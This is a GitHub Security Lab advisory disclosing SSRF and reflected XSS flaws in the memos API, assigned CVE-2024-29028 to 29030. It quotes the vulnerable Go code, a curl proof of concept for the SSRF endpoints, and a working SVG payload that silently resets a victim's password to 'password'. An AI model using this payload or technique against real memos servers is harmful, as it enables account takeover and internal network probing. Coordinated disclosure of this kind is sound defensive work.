
[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

April 18, 2024
# GHSL-2023-154\_GHSL-2023-156: Server-Side Request Forgery (SSRF) and Cross-Site Scripting (XSS) in memos API - CVE-2024-29028, CVE-2024-29029, CVE-2024-29030

[![Author avatar](https://avatars.githubusercontent.com/u/11400619)
Kevin Stubbings](https://github.com/Kwstubbs)

## Coordinated Disclosure Timeline

* 2023-07-26: Report sent to maintainer via Private Vulnerability Reporting.
* 2023-10-06: Vulnerabilities Fixed

## Summary

Multiple SSRF vulnerabilities exist in the memos API service that allow unauthenticated and authenticated users to enumerate and read from the internal network. In addition, one SSRF vulnerability leads to a reflected XSS vulnerability, which may allow an attacker complete control over the administrator account.

## Product

memos

## Tested Version

[v0.13.2](https://github.com/usememos/memos/releases/tag/v0.13.2)

## Details

### Issue 1: SSRF in `/o/get/httpmeta` (`GHSL-2023-154`)

An SSRF vulnerability exists at the [`/o/get/httpmeta`](https://github.com/usememos/memos/blob/06dbd8731161245444f4b50f4f9ed267f7c3cf63/api/v1/http_getter.go#L13) that allows unauthenticated users to enumerate the internal network and receive limited html values in json form.

```
func (*APIV1Service) registerGetterPublicRoutes(g *echo.Group) {
	g.GET("/get/httpmeta", func(c echo.Context) error {
		urlStr := c.QueryParam("url") <--- user input
		if urlStr == "" {
			return echo.NewHTTPError(http.StatusBadRequest, "Missing website url")
		}
		if _, err := url.Parse(urlStr); err != nil {
			return echo.NewHTTPError(http.StatusBadRequest, "Wrong url").SetInternal(err)
		}

		htmlMeta, err := getter.GetHTMLMeta(urlStr) <--- HTTP request using user input
		if err != nil {
			return echo.NewHTTPError(http.StatusNotAcceptable, fmt.Sprintf("Failed to get website meta with url: %s", urlStr)).SetInternal(err)
		}
		return c.JSON(http.StatusOK, htmlMeta)
	})

```
### Issue 2: SSRF in `/o/get/image` (`GHSL-2023-155`)

An SSRF vulnerability exists at the [`/o/get/image`](https://github.com/usememos/memos/blob/06dbd8731161245444f4b50f4f9ed267f7c3cf63/api/v1/http_getter.go#L29) that allows unauthenticated users to enumerate the internal network and retrieve images.
The response from the image request is then copied into the response of the current server request, causing a reflected XSS vulnerability.

```
	g.GET("/get/image", func(c echo.Context) error {
		urlStr := c.QueryParam("url") <-- user input
		if urlStr == "" {
			return echo.NewHTTPError(http.StatusBadRequest, "Missing image url")
		}
		if _, err := url.Parse(urlStr); err != nil {
			return echo.NewHTTPError(http.StatusBadRequest, "Wrong url").SetInternal(err)
		}

		image, err := getter.GetImage(urlStr) <-- html from user supplied URL
		if err != nil {
			return echo.NewHTTPError(http.StatusBadRequest, fmt.Sprintf("Failed to get image url: %s", urlStr)).SetInternal(err)
		}

		c.Response().Writer.WriteHeader(http.StatusOK)
		c.Response().Writer.Header().Set("Content-Type", image.Mediatype)
		c.Response().Writer.Header().Set(echo.HeaderCacheControl, "max-age=31536000, immutable")
		if _, err := c.Response().Writer.Write(image.Blob); err != nil {                            <-- html written to response, causing XSS
			return echo.NewHTTPError(http.StatusInternalServerError, "Failed to write image blob").SetInternal(err)
		}
		return nil
	})

```
### Issue 3: SSRF in `/api/resource` (`GHSL-2023-156`)

An SSRF vulnerability exists at the [`/api/resource`](https://github.com/usememos/memos/blob/06dbd8731161245444f4b50f4f9ed267f7c3cf63/api/v1/resource.go#L83) that allows authenticated users to enumerate the internal network.

```
func (s *APIV1Service) registerResourceRoutes(g *echo.Group) {
	g.POST("/resource", func(c echo.Context) error {
...
		if request.ExternalLink != "" {
			// Only allow those external links scheme with http/https
			linkURL, err := url.Parse(request.ExternalLink)
			if err != nil {
				return echo.NewHTTPError(http.StatusBadRequest, "Invalid external link").SetInternal(err)
			}
			if linkURL.Scheme != "http" && linkURL.Scheme != "https" {
				return echo.NewHTTPError(http.StatusBadRequest, "Invalid external link scheme")
			}

			if request.DownloadToLocal {
				resp, err := http.Get(linkURL.String())

```
#### Impact

SSRF issues may lead to `Information Disclosure` about the internet network.

XSS issue may lead to `Privilege Escalation` as it would allow anyone to login as the administrator account.

#### Resources

SSRF Proof Of Concept:

To access the unauthenticated endpoints:
`curl http://0.0.0.0:5230/o/get/<endpoint>?url=<full url>`

To access authenticated endpoint:
Log into memos -> Resources -> Create Resource -> Select External Link and Put in the Full URL to Enumerate. Ensure in the request that downloadToLocal is has value ‘true’.

XSS Proof of Concept:

An attacker will host the following SVG file. When a user (administrator or normal) clicks on the following link `http://0.0.0.0:5230/o/get/image?url=<attacker controlled svg file url>`, the user’s account password will be changed to `password` and the attacker can login.
<?xml version=”1.0” standalone=”no”?>
<!DOCTYPE svg PUBLIC “-//W3C//DTD SVG 1.1//EN” “http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd”>

```
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    var xmlhttp = new XMLHttpRequest();
    <!-- grab the current id and optionally username in json form -->
    xmlhttp.open("GET", "/api/user/me");
    xmlhttp.send();
    xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == XMLHttpRequest.DONE) {
        var id = JSON.parse(xmlhttp.responseText).data['id'];
        var xmlhttp2 = new XMLHttpRequest();
	<!-- update the password using the /api/user/id endpoint with the given id -->
        xmlhttp2.open("PATCH", `/api/user/${id}`)
        xmlhttp2.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
        xmlhttp2.send(JSON.stringify({ "id": id, "password": "password" }));
    }
}
  </script>
</svg>

```
## CVE

* GHSL-2023-154 has CVE-2024-29028
* GHSL-2023-155 has CVE-2024-29029
* GHSL-2023-156 has CVE-2024-29030

## Credit

These issues were discovered and reported by GHSL team member [@Kwstubbs (Kevin Stubbings)](https://github.com/Kwstubbs) with the help of CodeQL.

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-154`, `GHSL-2023-155`, or `GHSL-2023-156` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information

